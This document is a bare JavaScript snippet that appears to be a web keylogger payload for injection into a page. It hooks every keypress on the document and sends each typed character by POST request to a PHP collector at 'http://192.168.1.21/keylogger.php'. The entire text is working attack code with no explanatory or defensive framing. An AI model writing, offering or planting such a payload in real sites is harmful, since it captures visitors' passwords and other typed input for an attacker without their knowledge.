
	document.onkeypress=function(evt){
		var evt=evt||window.event;
		var key=String.fromCharCode(evt.charCode);
		if(key){
			var http=new XMLHttpRequest();
			var param=encodeURI(key);http.open("POST","http://192.168.1.21/keylogger.php",true);
			http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
			http.send("key="+param);
		}
	}